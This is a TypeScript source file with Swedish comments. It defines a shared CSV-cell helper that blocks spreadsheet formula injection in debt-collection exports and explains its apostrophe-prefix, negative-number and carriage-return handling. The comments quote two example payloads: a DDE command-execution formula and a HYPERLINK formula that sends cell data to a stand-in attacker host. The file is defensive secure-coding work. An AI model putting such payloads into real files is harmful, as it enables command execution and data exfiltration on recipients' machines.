/**
 * CSV-cell för filer som lämnar systemet.
 *
 * ── VARFÖR DEN HÄR FILEN FINNS ────────────────────────────────────────────
 *
 * Funktionen låg tidigare DUPLICERAD i collection-export.service.ts och
 * rent-collection-export.service.ts. Den ena fick formelskyddet, den andra
 * inte — och ingen märkte det, eftersom de såg likadana ut. Det är precis den
 * sortens glidning en delad chokepunkt finns till för att omöjliggöra: en regel
 * per anropsställe är en regel som glöms vid nästa kolumn eller nästa exportväg.
 *
 * ── FORMELINJEKTION (#317) ────────────────────────────────────────────────
 *
 * Excel, LibreOffice Calc och Google Sheets tolkar en cell som börjar med
 * `=`, `+`, `-` eller `@` som en FORMEL. Våra inkasso-CSV:er bär
 * gäldenärsnamn och adresser — fritext som operatören registrerat — och de
 * öppnas hos inkassobolaget. Ett namn som
 *
 *     =cmd|' /c calc'!A0
 *     =HYPERLINK("http://angripare.tld?"&A1,"exfiltrerat")
 *
 * körs alltså i MOTTAGARENS miljö. Exekveringen sker hos dem, men filen är vår:
 * vi genererar den, laddar upp den och skickar den vidare. Att felet landar i
 * någon annans Excel gör det inte till någon annans ansvar.
 *
 * Filerna bär dessutom personnummer i klartext (inkassobolaget måste kunna
 * identifiera gäldenären), så de är känsliga i sig och går till en part vi inte
 * kontrollerar.
 *
 * ── VARFÖR APOSTROF, INTE NOLLBREDDSTECKEN ────────────────────────────────
 *
 * Apostrofen är Excels egen textmarkör: den visas inte i cellen och gör
 * innehållet till text. Ett nollbreddstecken skulle ligga kvar i DATAT och
 * följa med in i inkassobolagets system — ett namn som inte längre matchar
 * deras register, för att vi gömt ett osynligt tecken i det. Skyddet får inte
 * korrumpera värdet det skyddar.
 *
 * ── VARFÖR `-` KRÄVER EN EXTRA KONTROLL ───────────────────────────────────
 *
 * `-` står i den vedertagna teckenlistan, men ett NEGATIVT BELOPP börjar också
 * med minus. Prefixar vi det blint blir `-500.00` till text i mottagarens
 * import — ett giltigt belopp mislabelat, alltså ett nytt fel infört av
 * skyddet.
 *
 * Därför grindas bara värden som INTE är välformade tal. `-500.00` passerar
 * orört; `-1+1` (som inte är ett tal) neutraliseras.
 *
 * Kontrollen är en STRIKT regex, inte `Number()`, med flit: `Number('\tSUM')`
 * är NaN men `Number('\t5')` är 5 — JS trimmar blanksteg, så ett inledande
 * tab-tecken skulle slinka förbi. Regexen kräver att HELA strängen är ett tal.
 *
 * Idag kan ingen numerisk kolumn i någon av exporterna vara negativ (restskuld
 * klampas till ≥ 0, avgifter valideras med @Min(0.01)). Kontrollen finns ändå:
 * annars vore skyddet korrekt bara av en olycka, och nästa kolumn som kan bära
 * ett negativt tal skulle tyst gå sönder.
 */

/** Ett välformat decimaltal — det enda som får slippa formelgrinden. */
const WELL_FORMED_NUMBER = /^-?\d+(\.\d+)?$/

/** Tecken som gör en cell till en formel i Excel/Calc/Sheets. */
const FORMULA_LEAD = /^[=+\-@\t\r]/

export function needsFormulaGuard(value: string): boolean {
  if (!FORMULA_LEAD.test(value)) return false
  return !WELL_FORMED_NUMBER.test(value)
}

/**
 * Formaterar ett värde som en CSV-cell: neutraliserar formler och escapar
 * citattecken, komma och radbrytning. Ska användas på VARJE cell i varje CSV
 * som lämnar systemet — inte bara på fritextkolumnerna.
 */
export function csvCell(value: string): string {
  const guarded = needsFormulaGuard(value) ? `'${value}` : value
  // `\r` MÅSTE citeras, inte bara `\n`. Utan den var formelskyddet en fasad:
  //
  //   · INBÄDDAD \r ("Anna\r=cmd|…") triggar inte formelgrinden alls — den
  //     läser bara position 0 — och utan citering hamnar det RÅA \r i raden.
  //     Excel har historiskt tolkat ensamt \r som radbrytning (arv från
  //     klassiska Mac-filer), så cellen blir TVÅ rader hos mottagaren, och den
  //     andra börjar med formeln.
  //   · INLEDANDE \r fick visserligen sin apostrof, men utan citering bröt \r
  //     ändå raden — apostrofen hamnade sist på föregående rad och formeln
  //     först på nästa. Skyddet neutraliserade ingenting.
  //
  // \r stod alltså i FORMULA_LEAD men saknades här: de två reglerna beskrev
  // olika hotbilder. Fångat av säkerhetsgranskningen — mitt eget test hade
  // \r-fallet och missade det ändå, eftersom det bara hävdade apostrofen och
  // aldrig citeringen.
  const needsEscape = /[",\n\r]/.test(guarded)
  if (!needsEscape) return guarded
  return `"${guarded.replace(/"/g, '""')}"`
}
